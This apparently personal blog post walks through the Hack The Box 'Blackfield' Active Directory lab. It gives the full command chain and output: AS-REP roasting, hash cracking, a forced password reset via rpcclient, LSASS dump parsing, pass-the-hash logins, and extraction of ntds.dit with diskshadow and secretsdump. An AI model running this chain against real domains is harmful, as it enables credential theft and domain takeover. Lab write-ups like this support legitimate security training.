---
layout: post
title: "Blackfield"
date: 2023-05-06
categories: [HTB, machine-hard-htb]
image: /assets/img/HTB/easy/Blackfield/Blackfield.png
---

>Blackfield machine involve usage of username discovered via guest session of smb and by checking for Asreproasting for any account and found one of account has it and with cracking of hashes of that account and got password of that account and it is support account.With use of bloodhound, i can see that support group have ability to forcechangepassword in one of account and by change password of that account then i have ability to use that account.The account in which i just change its password has folder shared called forensic in which i dump lsass and with it, i can dump hash of svc_backup.With use of pass the hash, i can login as svc_backup.This user svc_backup has priviledge called SeBackupPrivilege.With priviledge, i can do backup of ntds.dit and system and finally dump hashes of domain controllers.After dumping hashes of domain controllers, i will use administrator's hash and login as Administrator 

# Enumeration
- Starting by scanning for ports

```
export IP=10.10.10.192
mkdir -p nmaps && rustscan -a $IP --ulimit 5000 -- -vvv -Pn -sC -sV -oN nmaps/nmap_rustscansimple.txt
```

```
PORT    STATE SERVICE       REASON  VERSION
53/tcp  open  domain        syn-ack Simple DNS Plus
88/tcp  open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-05-06 12:38:04Z)
135/tcp open  msrpc         syn-ack Microsoft Windows RPC
389/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds? syn-ack
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m51s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48702/tcp): CLEAN (Timeout)
|   Check 2 (port 22426/tcp): CLEAN (Timeout)
|   Check 3 (port 17684/udp): CLEAN (Timeout)
|   Check 4 (port 53637/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-05-06T12:38:45
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May  6 08:39:34 2023 -- 1 IP address (1 host up) scanned in 106.55 seconds
```
- From above result, i can tell that I am dealing with Active Directory as port 88 is open

# SMB ENUMERATION
- Let start by know hostname of this windows and as seen from nmap, it is domain controller

```
crackmapexec smb $IP
```
- Output

```
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
```
- From above, i know that hostname is DC01 and domain is BLACKFIELD.local
- Since this is domain, let enumerate domain and if it fail then i will check for CVEs based on this service or other services
- let check for anonymous

```
smbclient -L $IP -U guest%''
```
- Output

```
Can't load /etc/samba/smb.conf - run testparm to debug it

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        profiles$       Disk
        SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```
- let checking permissions

```
crackmapexec smb $IP -u 'guest' -p '' --shares
```

![](/assets/img/HTB/easy/Blackfield/cme.png)
- i can see two folders which IPC$ and profiles$
- let start with profiles

```
smbclient \\\\$IP\\profiles$ -U 'guest'%''
```

![](/assets/img/HTB/easy/Blackfield/smbclient.png)
- it look like names of users
- let take them and try to check for some attacks

```
smbclient \\\\$IP\\profiles$ -U 'guest'%'' -c 'dir'|tee dummydata.txt
```

```
cat dummydata.txt|sed 's/^  //g'|awk '{ print $1}' > users.txt
```
- the rest dummy i will clean by hand

```
cat users.txt
```

```
AAlleni
ABarteski
ABekesz
ABenzies
ABiemiller
AChampken
ACheretei
ACsonaki
AHigchens
AJaquemai
AKlado
AKoffenburger
AKollolli
AKruppe
AKubale
ALamerz
AMaceldon
AMasalunga
ANavay
ANesterova
ANeusse
AOkleshen
APustulka
ARotella
ASanwardeker
AShadaia
ASischo
ASpruce
ATakach
ATaueg
ATwardowski
audit2020
AWangenheim
AWorsey
AZigmunt
BBakajza
BBeloucif
BCarmitcheal
BConsultant
BErdossy
BGeminski
BLostal
BMannise
BNovrotsky
BRigiero
BSamkoses
BZandonella
CAcherman
CAkbari
CAldhowaihi
CArgyropolous
CDufrasne
CGronk
Chiucarello
Chiuccariello
CHoytal
CKijauskas
CKolbo
CMakutenas
CMorcillo
CSchandall
CSelters
CTolmie
DCecere
DChintalapalli
DCwilich
DGarbatiuc
DKemesies
DMatuka
DMedeme
DMeherek
DMetych
DPaskalev
DPriporov
DRusanovskaya
DVellela
DVogleson
DZwinak
EBoley
EEulau
EFeatherling
EFrixione
EJenorik
EKmilanovic
ElKatkowsky
EmaCaratenuto
EPalislamovic
EPryar
ESachhitello
ESariotti
ETurgano
EWojtila
FAlirezai
FBaldwind
FBroj
FDeblaquire
FDegeorgio
FianLaginja
FLasokowski
FPflum
FReffey
GaBelithe
Gareld
GBatowski
GForshalger
GGomane
GHisek
GMaroufkhani
GMerewether
GQuinniey
GRoswurm
GWiegard
HBlaziewske
HColantino
HConforto
HCunnally
HGougen
HKostova
IChristijr
IKoledo
IKotecky
ISantosi
JAngvall
JBehmoiras
JDanten
JDjouka
JKondziola
JLeytushsenior
JLuthner
JMoorehendrickson
JPistachio
JScima
JSebaali
JShoenherr
JShuselvt
KAmavisca
KAtolikian
KBrokinn
KCockeril
KColtart
KCyster
KDorney
KKoesno
KLangfur
KMahalik
KMasloch
KMibach
KParvankova
KPregnolato
KRasmor
KShievitz
KSojdelius
KTambourgi
KVlahopoulos
KZyballa
LBajewsky
LBaligand
LBarhamand
LBirer
LBobelis
LChippel
LChoffin
LCominelli
LDruge
LEzepek
LHyungkim
LKarabag
LKirousis
LKnade
LKrioua
LLefebvre
LLoeradeavilez
LMichoud
LTindall
LYturbe
MArcynski
MAthilakshmi
MAttravanam
MBrambini
MHatziantoniou
MHoerauf
MKermarrec
MKillberg
MLapesh
MMakhsous
MMerezio
MNaciri
MShanmugarajah
MSichkar
MTemko
MTipirneni
MTonuri
MVanarsdel
NBellibas
NDikoka
NGenevro
NGoddanti
NMrdirk
NPulido
NRonges
NSchepkie
NVanpraet
OBelghazi
OBushey
OHardybala
OLunas
ORbabka
PBourrat
PBozzelle
PBranti
PCapperella
PCurtz
PDoreste
PGegnas
PMasulla
PMendlinger
PParakat
PProvencer
PTesik
PVinkovich
PVirding
PWeinkaus
RBaliukonis
RBochare
RKrnjaic
RNemnich
RPoretsky
RStuehringer
RSzewczuga
RVallandas
RWeatherl
RWissor
SAbdulagatov
SAjowi
SAlguwaihes
SBonaparte
SBouzane
SChatin
SDellabitta
SDhodapkar
SEulert
SFadrigalan
SGolds
SGrifasi
SGtlinas
SHauht
SHederian
SHelregel
SKrulig
SLewrie
SMaskil
Smocker
SMoyta
SRaustiala
SReppond
SSicliano
SSilex
SSolsbak
STousignaut
support
svc_backup
SWhyte
SWynigear
TAwaysheh
TBadenbach
TCaffo
TCassalom
TEiselt
TFerencdo
TGaleazza
TKauten
TKnupke
TLintlop
TMusselli
TOust
TSlupka
TStausland
TZumpella
UCrofskey
UMarylebone
UPyrke
VBublavy
VButziger
VFuscca
VLitschauer
VMamchuk
VMarija
VOlaosun
VPapalouca
WSaldat
WVerzhbytska
WZelazny
XBemelen
XDadant
XDebes
XKonegni
XRykiel
YBleasdale
YHuftalin
YKivlen
YKozlicki
YNyirenda
YPredestin
YSeturino
YSkoropada
YVonebers
YZarpentine
ZAlatti
ZKrenselewski
ZMalaab
ZMiick
ZScozzari
ZTimofeeff
ZWausik
```

# KERBEROS ENUMERATION
- Since i have username, let try to check for any account that has ASREPRoasting

```
impacket-GetNPUsers BLACKFIELD.local/ -no-pass -dc-ip $IP -format hashcat -outputfile hashes.asreproast -usersfile users.txt
```
- While i enumerate users and i saw this strange username but that is format of password

![](/assets/img/HTB/easy/Blackfield/asp.png)
- Output of above

![](/assets/img/HTB/easy/Blackfield/ke.png)
- GetNPusers was very slow but with use of kerbute

```
kerbrute userenum -d BLACKFIELD.local --dc $IP users.txt
```

![](/assets/img/HTB/easy/Blackfield/kerbrute.png)
- let crack hash found by GetNPUsers

```
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
```

![](/assets/img/HTB/easy/Blackfield/hashasp.png)
- let check if i can login

```
crackmapexec winrm 10.10.10.192 -u 'support' -p '#00^BlackKnight'
```
- Output

```
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [-] BLACKFIELD.local\support:#00^BlackKnight
```
- but it fails to login
- let try with smb and check permission

![](/assets/img/HTB/easy/Blackfield/cme0.png)
- Try to check some file/folders and i found nothing interesting
- let use bloodhound and enumerate
- Since i cant login so i will use bloodhound-python

```
echo -n "10.10.10.192 BLACKFIELD.local" >> /etc/hosts
echo -n "10.10.10.192 DC01.BLACKFIELD.local" >> /etc/hosts
bloodhound-python -d BLACKFIELD.local -u support -p '#00^BlackKnight' -gc DC01.BLACKFIELD.local -c all -ns 10.10.10.192
```

![](/assets/img/HTB/easy/Blackfield/bloodhound.png)

- let start neo4j

```
export PATH="/usr/lib/jvm/java-11-openjdk/bin":$PATH
sudo neo4j console
```
- After analysis our users in outbound object control and i found that i have right of ForceChangePassword to audit2020

![](/assets/img/HTB/easy/Blackfield/forcepassword.png)
- look at bloodhound for explanation in which i can change password without knowing password

![](/assets/img/HTB/easy/Blackfield/forcepassworddes.png)
- Since i cant login to domain controllers and then after awhile of googling and i came accross [article](https://github.com/lutzenfried/Methodology/blob/main/01-%20Internal.md#bloodyad---autobloody) in which you can change password remote with help of rpcclient

```
rpcclient -U support%'#00^BlackKnight' 10.10.10.192 -c "setuserinfo2 audit2020 23 'Pass123!'"
```

![](/assets/img/HTB/easy/Blackfield/rpcchange.png)
- Checking if i can login with user audit2020 and i cant login with that user

![](/assets/img/HTB/easy/Blackfield/auditnologin.png)
- let check for shares

```
smbclient -L \\\\10.10.10.192\\ -U 'audit2020'%'Pass123!'
```

```
smbclient \\\\10.10.10.192\\forensic -U 'audit2020'%'Pass123!'
```

![](/assets/img/HTB/easy/Blackfield/forensic.png)
- let download all files/folders in this share
- Since it contain too much file then i will use smbget

```
smbget -R smb://10.10.10.192/forensic -U audit2020%'Pass123!'
```

![](/assets/img/HTB/easy/Blackfield/smbget.png)
- One file seems interesting and it is lsass.zip
- it require to use [pypykatz](https://github.com/skelsec/pypykatz) and seting it to your environment according to the blog

```
~/tools/AD/pypykatz/ADev/bin/pypykatz lsa minidump lsass.DMP
```

![](/assets/img/HTB/easy/Blackfield/lsadump.png)
- let try to login with administrator but it fail but with try of svc_backup, i got access

```
evil-winrm -i 10.10.10.192 -u Administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
```

```
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

![](/assets/img/HTB/easy/Blackfield/user.png)
- i got flag for user

![](/assets/img/HTB/easy/Blackfield/userflag.png)
- Since this is backup user, right way i check for priviledge right 

```
whoami /all
```

![](/assets/img/HTB/easy/Blackfield/priv.png)
- i do have SeBackupPrivilege priviledge in which i will backup sam and system and i will use pass the hash of administrator

```
cd C:\windows\tasks
reg save hklm\sam C:\windows\tasks\sam
reg save hklm\system C:\windows\tasks\system
download C:\windows\tasks\sam /home/blackninja23/CTF/HTB/Blackfield/sam
download C:\windows\tasks\system /home/blackninja23/CTF/HTB/Blackfield/system
```
- the above command didnot work since they are being used only for local account but i did try them
- I read this [interest article about exploit it in Domain Controllers](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960)
- let download ntds
- I will save the following lines below with name called script.txt 

```
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

- I will take script.txt to Domain controller then i will execute with diskshadow

```
diskshadow /s script.txt
```

![](/assets/img/HTB/easy/Blackfield/diskshadow.png)
- i will copy ntds from disk that create by diskshadow command to our current directory

```
robocopy /b E:\windows\ntds . ntds.dit
```

![](/assets/img/HTB/easy/Blackfield/robocopy.png)
- let copy ntds.dit to our current direcorty

```
download C:\windows\tasks\ntds.dit /home/blackninja23/CTF/HTB/Blackfield/ntds.dit
```
- let dump hashes using secretdump

```
impacket-secretsdump -system system -ntds ntds.dit LOCAL
```

![](/assets/img/HTB/easy/Blackfield/secretdump.png)
- let use the hash and try to login as Administrator by pass the hash

```
evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
```

![](/assets/img/HTB/easy/Blackfield/rooted.png)

![](/assets/img/HTB/easy/Blackfield/finish.png)

